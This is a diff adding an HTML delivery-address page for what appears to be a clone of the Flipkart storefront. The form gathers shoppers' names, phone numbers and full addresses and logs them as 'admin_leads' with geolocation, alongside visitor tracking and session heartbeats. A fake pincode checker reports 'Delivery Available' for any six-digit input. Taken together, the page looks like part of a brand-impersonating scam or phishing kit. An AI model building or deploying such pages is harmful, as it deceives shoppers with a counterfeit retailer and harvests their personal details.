@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <link rel="icon" type="image/x-icon" href="assets/images/favicon.ico">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Add delivery address - Flipkart</title>
+    <link rel="stylesheet" href="assets/css/style.css">
+</head>
+<body>
+    <!-- Header -->
+    <div class="checkout-header">
+        <a href="index.html" class="back-arrow" id="backArrow">←</a>
+        <h2>Add delivery address</h2>
+    </div>
+
+    <!-- Stepper -->
+    <div class="stepper">
+        <div class="step active">
+            <div class="step-circle">1</div>
+            <div class="step-label">Address</div>
+        </div>
+        <div class="step-line"></div>
+        <div class="step">
+            <div class="step-circle">2</div>
+            <div class="step-label">Order Summary</div>
+        </div>
+        <div class="step-line"></div>
+        <div class="step">
+            <div class="step-circle">3</div>
+            <div class="step-label">Payment</div>
+        </div>
+    </div>
+
+    <!-- Address Form -->
+    <form method="POST" action="#" class="address-form" id="addressForm">
+        <input type="hidden" name="color" id="colorInput" value="">
+
+        <div class="form-group">
+            <input type="text" name="full_name" placeholder="Full Name (Required)*" required>
+        </div>
+
+        <div class="form-group">
+            <input type="tel" name="mobile" placeholder="Mobile number (Required)*" pattern="[0-9]{10}" maxlength="10" required>
+        </div>
+
+        <div class="form-group" style="position:relative;">
+            <input type="text" name="pincode" id="pincodeInput" placeholder="Pincode (Required)*" pattern="[0-9]{6}" maxlength="6" required>
+            <div id="pincodeStatus" style="font-size: 11px; margin-top: 4px; display: none; text-align: left; font-weight: 500;"></div>
+        </div>
+
+        <div class="form-row">
+            <div class="form-group">
+                <input type="text" name="city" placeholder="City (Required)*" required>
+            </div>
+            <div class="form-group">
+                <select name="state" required>
+                    <option value="Andhra Pradesh">Andhra Pradesh</option>
+                    <option value="Arunachal Pradesh">Arunachal Pradesh</option>
+                    <option value="Assam">Assam</option>
+                    <option value="Bihar">Bihar</option>
+                    <option value="Chhattisgarh">Chhattisgarh</option>
+                    <option value="Goa">Goa</option>
+                    <option value="Gujarat">Gujarat</option>
+                    <option value="Haryana">Haryana</option>
+                    <option value="Himachal Pradesh">Himachal Pradesh</option>
+                    <option value="Jharkhand">Jharkhand</option>
+                    <option value="Karnataka">Karnataka</option>
+                    <option value="Kerala">Kerala</option>
+                    <option value="Madhya Pradesh">Madhya Pradesh</option>
+                    <option value="Maharashtra">Maharashtra</option>
+                    <option value="Manipur">Manipur</option>
+                    <option value="Meghalaya">Meghalaya</option>
+                    <option value="Mizoram">Mizoram</option>
+                    <option value="Nagaland">Nagaland</option>
+                    <option value="Odisha">Odisha</option>
+                    <option value="Punjab">Punjab</option>
+                    <option value="Rajasthan">Rajasthan</option>
+                    <option value="Sikkim">Sikkim</option>
+                    <option value="Tamil Nadu">Tamil Nadu</option>
+                    <option value="Telangana">Telangana</option>
+                    <option value="Tripura">Tripura</option>
+                    <option value="Uttar Pradesh">Uttar Pradesh</option>
+                    <option value="Uttarakhand">Uttarakhand</option>
+                    <option value="West Bengal">West Bengal</option>
+                    <option value="Delhi">Delhi</option>
+                    <option value="Jammu & Kashmir">Jammu & Kashmir</option>
+                    <option value="Ladakh">Ladakh</option>
+                    <option value="Chandigarh">Chandigarh</option>
+                    <option value="Puducherry">Puducherry</option>
+                </select>
+            </div>
+        </div>
+
+        <div class="form-group">
+            <input type="text" name="house_no" placeholder="House No., Building Name (Required)*" required>
+        </div>
+
+        <div class="form-group">
+            <input type="text" name="road_name" placeholder="Road name, Area, Colony (Required)*" required>
+        </div>
+
+        <!-- Free Shipping Banner -->
+        <div class="free-shipping-banner" style="margin:16px 0;">
+            <div style="display:flex;align-items:center;gap:12px;justify-content:center;">
+                <span style="font-size:36px;">🚚</span>
+                <div>
+                    <h3>Free Shipping</h3>
+                    <p>On Your 1<sup>st</sup> Order</p>
+                </div>
+            </div>
+        </div>
+
+        <button type="submit" class="btn-save-address" style="width:100%;margin:0;">Save Address</button>
+    </form>
+
+    <script>
+        window.addEventListener('DOMContentLoaded', () => {
+            // Track visitor
+            try {
+                const stats = JSON.parse(localStorage.getItem('admin_stats') || '{"home":0,"product":0,"address":0,"cart":0,"payment":0,"mobile":0,"desktop":0}');
+                stats.address++;
+                localStorage.setItem('admin_stats', JSON.stringify(stats));
+            } catch (e) {
+                console.error("Tracking error", e);
+            }
+
+            // Realtime User Heartbeat
+            try {
+                function updateHeartbeat() {
+                    let sessionId = sessionStorage.getItem('user_session_id');
+                    if (!sessionId) {
+                        sessionId = 'SESS_' + Math.random().toString(36).substring(2, 9) + Date.now();
+                        sessionStorage.setItem('user_session_id', sessionId);
+                    }
+                    
+                    const geo = JSON.parse(localStorage.getItem('user_geo') || '{"city":"Unknown","region":"Unknown"}');
+                    const sessionData = {
+                        id: sessionId,
+                        page: 'Address Form',
+                        last_active: Date.now(),
+                        device: /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop',
+                        city: geo.city,
+                        region: geo.region
+                    };
+                    localStorage.setItem('admin_sess_' + sessionId, JSON.stringify(sessionData));
+                }
+                setInterval(updateHeartbeat, 3000);
+                updateHeartbeat();
+            } catch(e) {
+                console.error("Heartbeat error", e);
+            }
+
+            const urlParams = new URLSearchParams(window.location.search);
+            const productId = urlParams.get('id');
+            const color = urlParams.get('color');
+
+            if (productId) {
+                document.getElementById('backArrow').href = `product.html?id=${productId}`;
+            }
+            if (color) {
+                document.getElementById('colorInput').value = color;
+            }
+
+            // Pincode Validator logic
+            const pincodeInput = document.getElementById('pincodeInput');
+            const pincodeStatus = document.getElementById('pincodeStatus');
+            
+            pincodeInput.addEventListener('input', (e) => {
+                const val = e.target.value;
+                if (/^[0-9]{6}$/.test(val)) {
+                    pincodeStatus.style.display = 'block';
+                    pincodeStatus.style.color = '#388e3c';
+                    pincodeStatus.innerHTML = '⚡ Checking availability...';
+                    
+                    setTimeout(() => {
+                        pincodeStatus.innerHTML = '✅ Delivery Available: Fast shipping within 2 days';
+                    }, 800);
+                } else if (val.length > 0 && val.length < 6) {
+                    pincodeStatus.style.display = 'block';
+                    pincodeStatus.style.color = '#ff9800';
+                    pincodeStatus.innerHTML = 'Enter 6-digit pincode';
+                } else {
+                    pincodeStatus.style.display = 'none';
+                }
+            });
+
+            // Form Submit Intercept
+            document.getElementById('addressForm').addEventListener('submit', (e) => {
+                e.preventDefault();
+                
+                // Get form values
+                const formData = new FormData(e.target);
+                const addressData = {
+                    name: formData.get('full_name'),
+                    phone: formData.get('mobile'),
+                    pincode: formData.get('pincode'),
+                    city: formData.get('city'),
+                    state: formData.get('state'),
+                    house: formData.get('house_no'),
+                    road: formData.get('road_name')
+                };
+
+                // Store in localStorage
+                localStorage.setItem('savedAddress', JSON.stringify(addressData));
+
+                // Log lead to admin leads
+                try {
+                    const geo = JSON.parse(localStorage.getItem('user_geo') || '{"city":"Unknown","region":"Unknown"}');
+                    const leads = JSON.parse(localStorage.getItem('admin_leads') || '[]');
+                    leads.unshift({
+                        timestamp: new Date().toISOString(),
+                        productId: productId || 'Unknown',
+                        color: color || 'Default',
+                        geoCity: geo.city,
+                        geoRegion: geo.region,
+                        ...addressData
+                    });
+                    localStorage.setItem('admin_leads', JSON.stringify(leads));
+                } catch (err) {
+                    console.error("Lead logging error", err);
+                }
+
+                // Navigate to cart.html
+                let dest = `cart.html?id=${productId || ''}`;
+                if (color) {
+                    dest += `&color=${encodeURIComponent(color)}`;
+                }
+                window.location.href = dest;
+            });
+        });
+    </script>
+</body>
+</html>
